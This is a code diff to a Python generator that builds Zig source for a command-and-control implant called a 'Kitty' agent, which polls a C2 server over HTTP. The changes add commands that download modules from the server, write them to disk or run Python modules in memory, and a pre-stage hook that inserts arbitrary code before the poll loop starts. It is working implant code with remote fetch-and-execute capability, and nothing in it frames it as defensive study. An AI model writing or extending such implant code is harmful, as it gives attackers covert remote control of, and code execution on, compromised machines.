@@ -4,6 +4,8 @@
 
 from __future__ import annotations
 
+from lib.c2.zig_memimporter import build_zig_memimporter_block
+
 # Zig source uses __TOKEN__ placeholders so Python f-strings never collide with Zig {s}.
 _ZIG_KITTY_TEMPLATE = r'''const std = @import("std");
 const builtin = @import("builtin");
@@ -451,6 +453,78 @@ fn buildResultBody(allocator: mem.Allocator, task_id: []const u8, enc_out: []con
     return try list.toOwnedSlice(allocator);
 }
 
+fn urlEncodeQuery(allocator: mem.Allocator, input: []const u8) ![]u8 {
+    var list: std.ArrayList(u8) = .empty;
+    errdefer list.deinit(allocator);
+    for (input) |c| {
+        const safe = (c >= 'A' and c <= 'Z') or (c >= 'a' and c <= 'z') or
+            (c >= '0' and c <= '9') or c == '-' or c == '_' or c == '.';
+        if (safe) {
+            try list.append(allocator, c);
+        } else {
+            try std.fmt.format(list.writer(allocator), "%{X:0>2}", .{c});
+        }
+    }
+    return try list.toOwnedSlice(allocator);
+}
+
+__ZIG_MEMIMPORTER__
+
+fn fetchRemoteModuleContent(allocator: mem.Allocator, module_path: []const u8, language: []const u8) ![]u8 {
+    if (module_path.len == 0) return error.EmptyModulePath;
+    if (modCacheGet(allocator, module_path)) |cached| {
+        return try allocator.dupe(u8, cached);
+    }
+    const enc_path = try urlEncodeQuery(allocator, module_path);
+    defer allocator.free(enc_path);
+    const lang = if (language.len > 0) language else "python";
+    const path = try std.fmt.allocPrint(allocator, "{s}/module?id={s}&path={s}&language={s}", .{ PREFIX, CID, enc_path, lang });
+    defer allocator.free(path);
+    const raw = try httpExchange(allocator, "GET", path, null);
+    defer allocator.free(raw);
+    var parsed = json.parseFromSlice(json.Value, allocator, raw, .{}) catch return error.InvalidModuleResponse;
+    defer parsed.deinit();
+    const content = jStr(parsed.value, "content") orelse return error.EmptyModuleContent;
+    const digest = jStr(parsed.value, "sha256") orelse "";
+    if (digest.len > 0) {
+        var hasher = std.crypto.hash.sha2.Sha256.init(.{});
+        hasher.update(content);
+        var out_hash: [32]u8 = undefined;
+        hasher.final(&out_hash);
+        var hex_buf: [64]u8 = undefined;
+        _ = std.fmt.bufPrint(&hex_buf, "{s}", .{std.fmt.fmtSliceHexLower(&out_hash)}) catch {};
+        if (!mem.eql(u8, digest, hex_buf[0..64])) {
+            return error.ModuleDigestMismatch;
+        }
+    }
+    try modCachePut(allocator, module_path, content);
+    return try allocator.dupe(u8, content);
+}
+
+fn fetchRemoteModule(allocator: mem.Allocator, module_path: []const u8, dest_path: []const u8, language: []const u8) ![]u8 {
+    const content = fetchRemoteModuleContent(allocator, module_path, language) catch |e| {
+        return try std.fmt.allocPrint(allocator, "ERROR:{s}", .{@errorName(e)});
+    };
+    defer allocator.free(content);
+    if (dest_path.len > 0) {
+        try std.fs.cwd().writeFile(.{ .sub_path = dest_path, .data = content });
+        return try std.fmt.allocPrint(allocator, "OK cached {s} -> {s} ({d} bytes)", .{ module_path, dest_path, content.len });
+    }
+    return try std.fmt.allocPrint(allocator, "OK cached {s} in memory ({d} bytes)", .{ module_path, content.len });
+}
+
+fn runRemoteModule(allocator: mem.Allocator, module_path: []const u8, language: []const u8) ![]u8 {
+    const lang = if (language.len > 0) language else "python";
+    const content = fetchRemoteModuleContent(allocator, module_path, lang) catch |e| {
+        return try std.fmt.allocPrint(allocator, "ERROR:{s}", .{@errorName(e)});
+    };
+    defer allocator.free(content);
+    if (mem.eql(u8, lang, "python") or mem.eql(u8, lang, "py")) {
+        return execPythonModuleInMemory(allocator, content);
+    }
+    return try std.fmt.allocPrint(allocator, "ERROR:unsupported language {s}", .{lang});
+}
+
 fn runTask(allocator: mem.Allocator, task: json.Value) !TaskResult {
     var die = false;
     var status: []const u8 = "completed";
@@ -564,6 +638,17 @@ fn runTask(allocator: mem.Allocator, task: json.Value) !TaskResult {
         stopSocks();
         allocator.free(out);
         out = try allocator.dupe(u8, "SOCKS5 stop requested");
+    } else if (mem.eql(u8, cmd, "fetch_module")) {
+        const mod_path = jStr(args, "path") orelse jStr(args, "module_path") orelse "";
+        const dest = jStr(args, "dest") orelse jStr(args, "save_as") orelse "";
+        const lang = jStr(args, "language") orelse "python";
+        allocator.free(out);
+        out = fetchRemoteModule(allocator, mod_path, dest, lang) catch |e| try std.fmt.allocPrint(allocator, "ERROR:{s}", .{@errorName(e)});
+    } else if (mem.eql(u8, cmd, "run_module")) {
+        const mod_path = jStr(args, "path") orelse jStr(args, "module_path") orelse "";
+        const lang = jStr(args, "language") orelse "python";
+        allocator.free(out);
+        out = runRemoteModule(allocator, mod_path, lang) catch |e| try std.fmt.allocPrint(allocator, "ERROR:{s}", .{@errorName(e)});
     } else if (mem.eql(u8, cmd, "exit")) {
         allocator.free(out);
         out = try allocator.dupe(u8, "bye");
@@ -611,10 +696,14 @@ fn handleTaskValue(allocator: mem.Allocator, task: json.Value, next_sleep: u64) 
     return false;
 }
 
+__PRESTAGE_HELPERS__
+
 pub fn main() !void {
     var gpa = std.heap.GeneralPurposeAllocator(.{ .safety = false }){};
     defer _ = gpa.deinit();
     const allocator = gpa.allocator();
+
+__PRESTAGE__
 
     while (true) {
         const path = buildPollPath(allocator, "poll") catch {
@@ -698,6 +787,7 @@ def build_zig_kitty_http_source(
     user_agent: str = "Mozilla/5.0",
     ed25519_seed_hex: str = "",
     use_ssl: bool = False,
+    prestage_code: str = "",
 ) -> str:
     """Return Zig source for a typed Kitty agent against reverse_http_polling."""
     prefix = "/" + str(url_prefix or "/c2").strip("/")
@@ -707,6 +797,9 @@ def build_zig_kitty_http_source(
     seed = "".join(c for c in str(ed25519_seed_hex or "") if c in "0123456789abcdefABCDEF")
     if len(seed) not in (0, 64):
         seed = ""
+    prestage = str(prestage_code or "").strip()
+    if prestage and not prestage.endswith("\n"):
+        prestage += "\n"
     return (
         _ZIG_KITTY_TEMPLATE.replace("__HOST__", h)
         .replace("__PORT__", str(int(port or 8088)))
@@ -716,4 +809,7 @@ def build_zig_kitty_http_source(
         .replace("__UA__", ua)
         .replace("__ED25519_SEED_HEX__", seed)
         .replace("__USE_SSL__", "true" if use_ssl else "false")
+        .replace("__PRESTAGE_HELPERS__", "")
+        .replace("__PRESTAGE__", prestage)
+        .replace("__ZIG_MEMIMPORTER__", build_zig_memimporter_block())
     )
